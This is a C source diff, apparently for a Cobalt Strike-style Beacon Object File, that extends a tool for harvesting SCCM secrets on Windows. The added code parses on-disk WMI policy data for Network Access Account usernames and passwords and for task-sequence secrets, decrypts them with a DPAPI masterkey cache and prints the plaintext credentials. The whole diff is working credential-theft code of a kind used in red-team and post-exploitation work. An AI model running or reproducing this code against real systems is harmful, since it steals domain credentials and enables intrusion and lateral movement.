@@ -35,6 +35,15 @@ static const IID SCCM_IID_WBEM_LOCATOR = {
     0xdc12a687, 0x737f, 0x11cf, { 0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 }
 };
 
+static const BYTE SCCM_POLICY_OPEN[] = "<PolicySecret Version=\"1\"><![CDATA[";
+static const BYTE SCCM_CDATA_CLOSE[] = "]]>";
+static const BYTE SCCM_NAA_CLASS_TAG[] = "CCM_NetworkAccessAccount";
+static const BYTE SCCM_NAA_USER_PROP[] = "NetworkAccessUsername";
+static const BYTE SCCM_NAA_PASS_PROP[] = "NetworkAccessPassword";
+static const BYTE SCCM_TS_ANCHOR[] = "</SWDReserved>";
+
+static BOOL looks_like_utf16le(const BYTE* data, int data_len);
+
 /* ---- Internal: read file into buffer ---- */
 static BOOL read_file_bytes(const wchar_t* path, BYTE** out_data, int* out_len) {
     HANDLE hFile;
@@ -946,6 +955,81 @@ static char* extract_wmi_policy_secret_hex(const wchar_t* value) {
     return hex;
 }
 
+static int find_bytes_in_range(const BYTE* data, int data_len, int start, int end,
+                               const BYTE* needle, int needle_len) {
+    int pos;
+
+    if (!data || !needle || data_len <= 0 || needle_len <= 0) return -1;
+    if (start < 0) start = 0;
+    if (end > data_len) end = data_len;
+    if (start >= end || start + needle_len > end) return -1;
+
+    pos = find_bytes(data, data_len, start, needle, needle_len);
+    if (pos < 0 || pos + needle_len > end) return -1;
+    return pos;
+}
+
+static char* extract_policy_secret_hex_after(const BYTE* data, int data_len,
+                                             int anchor, int end) {
+    int open;
+    int secret_start;
+    int close;
+
+    if (!data || data_len <= 0) return NULL;
+    if (anchor < 0) anchor = 0;
+    if (end > data_len) end = data_len;
+    if (anchor >= end) return NULL;
+
+    open = find_bytes_in_range(data, data_len, anchor, end,
+                               SCCM_POLICY_OPEN, (int)(sizeof(SCCM_POLICY_OPEN) - 1));
+    if (open < 0) return NULL;
+
+    secret_start = open + (int)(sizeof(SCCM_POLICY_OPEN) - 1);
+    close = find_bytes_in_range(data, data_len, secret_start, end,
+                                SCCM_CDATA_CLOSE, (int)(sizeof(SCCM_CDATA_CLOSE) - 1));
+    if (close < 0) return NULL;
+
+    return extract_ascii(data, secret_start, close);
+}
+
+static char* secret_bytes_to_utf8(const BYTE* data, int data_len) {
+    int utf16_len;
+    char* utf8;
+    char* ascii;
+    int trimmed;
+
+    if (!data || data_len <= 0) return NULL;
+
+    utf16_len = data_len;
+    while (utf16_len >= 2 &&
+           data[utf16_len - 2] == 0 &&
+           data[utf16_len - 1] == 0) {
+        utf16_len -= 2;
+    }
+
+    if (utf16_len > 0 &&
+        (utf16_len % 2) == 0 &&
+        looks_like_utf16le(data, utf16_len)) {
+        wchar_t* wtmp = (wchar_t*)intAlloc(utf16_len + sizeof(wchar_t));
+        if (!wtmp) return NULL;
+        memcpy(wtmp, data, utf16_len);
+        wtmp[utf16_len / 2] = L'\0';
+        utf8 = wide_to_utf8(wtmp);
+        intFree(wtmp);
+        return utf8;
+    }
+
+    trimmed = data_len;
+    while (trimmed > 0 && data[trimmed - 1] == 0) trimmed--;
+    if (trimmed <= 0 || trimmed > 16384) return NULL;
+
+    ascii = (char*)intAlloc(trimmed + 1);
+    if (!ascii) return NULL;
+    memcpy(ascii, data, trimmed);
+    ascii[trimmed] = '\0';
+    return ascii;
+}
+
 static BOOL looks_like_utf16le(const BYTE* data, int data_len) {
     if (!data || data_len < 4 || (data_len % 2) != 0) return FALSE;
 
@@ -1134,7 +1218,15 @@ static int triage_sccm_secret(const char* label,
 
     ok = decrypt_sccm_secret_hex(protected_hex, cache, &decrypted, &decrypted_len);
     if (ok) {
+        char* text = secret_bytes_to_utf8(decrypted, decrypted_len);
         print_secret_value(label, decrypted, decrypted_len);
+        if (text) {
+            if (strstr(text, "<PolicyXML") && strstr(text, "Compression=\"zlib\"")) {
+                BeaconPrintf(CALLBACK_OUTPUT,
+                             "    [*] Decrypted SCCM policy XML uses zlib compression; BOF decompression is not implemented yet\n");
+            }
+            intFree(text);
+        }
         if (machine_account && is_sccm_machine_account_value(decrypted, decrypted_len)) {
             *machine_account = TRUE;
         }
@@ -1144,6 +1236,131 @@ static int triage_sccm_secret(const char* label,
 
     if (decrypted) intFree(decrypted);
     return ok ? 1 : 0;
+}
+
+static int triage_sccm_disk_naa(const BYTE* data, int data_len, MASTERKEY_CACHE* cache) {
+    int pos = 0;
+    int accounts = 0;
+    int decrypted = 0;
+
+    while (pos < data_len) {
+        int class_pos;
+        int next_class_pos;
+        int region_end;
+        int pass_prop_pos;
+        int user_prop_pos;
+        char* pass_hex = NULL;
+        char* user_hex = NULL;
+        BOOL machine_account = FALSE;
+
+        class_pos = find_bytes(data, data_len, pos,
+                               SCCM_NAA_CLASS_TAG, (int)(sizeof(SCCM_NAA_CLASS_TAG) - 1));
+        if (class_pos < 0) break;
+
+        next_class_pos = find_bytes(data, data_len,
+                                    class_pos + (int)(sizeof(SCCM_NAA_CLASS_TAG) - 1),
+                                    SCCM_NAA_CLASS_TAG, (int)(sizeof(SCCM_NAA_CLASS_TAG) - 1));
+        region_end = data_len;
+        if (next_class_pos >= 0 && next_class_pos < region_end) region_end = next_class_pos;
+        if (class_pos + 32768 < region_end) region_end = class_pos + 32768;
+
+        pass_prop_pos = find_bytes_in_range(data, data_len, class_pos, region_end,
+                                            SCCM_NAA_PASS_PROP, (int)(sizeof(SCCM_NAA_PASS_PROP) - 1));
+        user_prop_pos = find_bytes_in_range(data, data_len, class_pos, region_end,
+                                            SCCM_NAA_USER_PROP, (int)(sizeof(SCCM_NAA_USER_PROP) - 1));
+
+        if (pass_prop_pos >= 0) {
+            int pass_end = region_end;
+            if (user_prop_pos > pass_prop_pos && user_prop_pos < pass_end) pass_end = user_prop_pos;
+            pass_hex = extract_policy_secret_hex_after(data, data_len, pass_prop_pos, pass_end);
+        }
+        if (user_prop_pos >= 0) {
+            user_hex = extract_policy_secret_hex_after(data, data_len, user_prop_pos, region_end);
+        }
+
+        if (!pass_hex || !user_hex) {
+            /* SharpSCCM/SCCMHunter order for disk NAA records is password then username. */
+            if (!pass_hex) {
+                pass_hex = extract_policy_secret_hex_after(data, data_len, class_pos, region_end);
+            }
+            if (!user_hex && pass_hex) {
+                int first_open = find_bytes_in_range(data, data_len, class_pos, region_end,
+                                                     SCCM_POLICY_OPEN, (int)(sizeof(SCCM_POLICY_OPEN) - 1));
+                if (first_open >= 0) {
+                    int after_first = first_open + (int)(sizeof(SCCM_POLICY_OPEN) - 1);
+                    int first_close = find_bytes_in_range(data, data_len, after_first, region_end,
+                                                          SCCM_CDATA_CLOSE, (int)(sizeof(SCCM_CDATA_CLOSE) - 1));
+                    if (first_close >= 0) {
+                        user_hex = extract_policy_secret_hex_after(data, data_len,
+                                                                   first_close + (int)(sizeof(SCCM_CDATA_CLOSE) - 1),
+                                                                   region_end);
+                    }
+                }
+            }
+        }
+
+        if (pass_hex || user_hex) {
+            accounts++;
+            BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Triaging SCCM Network Access Account #%d\n", accounts);
+            decrypted += triage_sccm_secret("Plaintext NAA Username", user_hex, cache, &machine_account);
+            decrypted += triage_sccm_secret("Plaintext NAA Password", pass_hex, cache, &machine_account);
+            if (machine_account) {
+                BeaconPrintf(CALLBACK_OUTPUT,
+                             "    [!] SCCM is configured to use the client's machine account instead of an NAA\n");
+            }
+        }
+
+        if (pass_hex) intFree(pass_hex);
+        if (user_hex) intFree(user_hex);
+
+        pos = class_pos + (int)(sizeof(SCCM_NAA_CLASS_TAG) - 1);
+    }
+
+    if (accounts == 0) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found 0 SCCM Network Access Account entries\n");
+    }
+
+    return decrypted;
+}
+
+static int triage_sccm_disk_task_sequences(const BYTE* data, int data_len, MASTERKEY_CACHE* cache) {
+    int pos = 0;
+    int sequences = 0;
+    int decrypted = 0;
+
+    while (pos < data_len) {
+        int anchor_pos;
+        int next_anchor_pos;
+        int region_end;
+        char* secret_hex;
+
+        anchor_pos = find_bytes(data, data_len, pos,
+                                SCCM_TS_ANCHOR, (int)(sizeof(SCCM_TS_ANCHOR) - 1));
+        if (anchor_pos < 0) break;
+
+        next_anchor_pos = find_bytes(data, data_len,
+                                     anchor_pos + (int)(sizeof(SCCM_TS_ANCHOR) - 1),
+                                     SCCM_TS_ANCHOR, (int)(sizeof(SCCM_TS_ANCHOR) - 1));
+        region_end = data_len;
+        if (next_anchor_pos >= 0 && next_anchor_pos < region_end) region_end = next_anchor_pos;
+        if (anchor_pos + 65536 < region_end) region_end = anchor_pos + 65536;
+
+        secret_hex = extract_policy_secret_hex_after(data, data_len, anchor_pos, region_end);
+        if (secret_hex) {
+            sequences++;
+            BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Triaging SCCM Task Sequence #%d\n", sequences);
+            decrypted += triage_sccm_secret("Plaintext Task Sequence", secret_hex, cache, NULL);
+            intFree(secret_hex);
+        }
+
+        pos = anchor_pos + (int)(sizeof(SCCM_TS_ANCHOR) - 1);
+    }
+
+    if (sequences == 0) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found 0 SCCM task sequence entries\n");
+    }
+
+    return decrypted;
 }
 
 BOOL triage_sccm_wmi(void) {
@@ -1370,65 +1587,14 @@ BOOL triage_sccm_disk(MASTERKEY_CACHE* cache, const wchar_t* target) {
         return FALSE;
     }
 
-    const BYTE class_tag[] = "CCM_NetworkAccessAccount";
-    const BYTE policy_open[] = "<PolicySecret Version=\"1\"><![CDATA[";
-    const BYTE cdata_close[] = "]]>";
-
-    int pos = 0;
-    int accounts = 0;
     int decrypted = 0;
 
-    while (pos < data_len) {
-        int class_pos = find_bytes(data, data_len, pos, class_tag, (int)(sizeof(class_tag) - 1));
-        if (class_pos < 0) break;
+    decrypted += triage_sccm_disk_naa(data, data_len, cache);
+    decrypted += triage_sccm_disk_task_sequences(data, data_len, cache);
 
-        int open1 = find_bytes(data, data_len, class_pos, policy_open, (int)(sizeof(policy_open) - 1));
-        int close1 = (open1 >= 0)
-            ? find_bytes(data, data_len, open1 + (int)(sizeof(policy_open) - 1), cdata_close, (int)(sizeof(cdata_close) - 1))
-            : -1;
-        int open2 = (close1 >= 0)
-            ? find_bytes(data, data_len, close1 + (int)(sizeof(cdata_close) - 1), policy_open, (int)(sizeof(policy_open) - 1))
-            : -1;
-        int close2 = (open2 >= 0)
-            ? find_bytes(data, data_len, open2 + (int)(sizeof(policy_open) - 1), cdata_close, (int)(sizeof(cdata_close) - 1))
-            : -1;
-
-        if (open1 < 0 || close1 < 0 || open2 < 0 || close2 < 0) {
-            pos = class_pos + (int)(sizeof(class_tag) - 1);
-            continue;
-        }
-
-        char* user_hex = extract_ascii(data,
-            open1 + (int)(sizeof(policy_open) - 1), close1);
-        char* pass_hex = extract_ascii(data,
-            open2 + (int)(sizeof(policy_open) - 1), close2);
-
-        accounts++;
-        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Triaging SCCM Network Access Account #%d\n", accounts);
-
-        if (user_hex && pass_hex) {
-            BOOL machine_account = FALSE;
-            decrypted += triage_sccm_secret("Plaintext NAA Username", user_hex, cache, &machine_account);
-            decrypted += triage_sccm_secret("Plaintext NAA Password", pass_hex, cache, &machine_account);
-            if (machine_account) {
-                BeaconPrintf(CALLBACK_OUTPUT,
-                             "    [!] SCCM is configured to use the client's machine account instead of an NAA\n");
-            }
-        }
-
-        if (user_hex) intFree(user_hex);
-        if (pass_hex) intFree(pass_hex);
-
-        pos = close2 + (int)(sizeof(cdata_close) - 1);
-    }
-
-    if (accounts == 0) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found 0 SCCM Network Access Account entries\n");
-    } else {
-        BeaconPrintf(CALLBACK_OUTPUT,
-            "\n[*] SCCM triage complete: %d account entries, %d decrypted secrets\n",
-            accounts, decrypted);
-    }
+    BeaconPrintf(CALLBACK_OUTPUT,
+        "\n[*] SCCM disk triage complete: %d decrypted secrets\n",
+        decrypted);
 
     intFree(data);
     return (decrypted > 0);
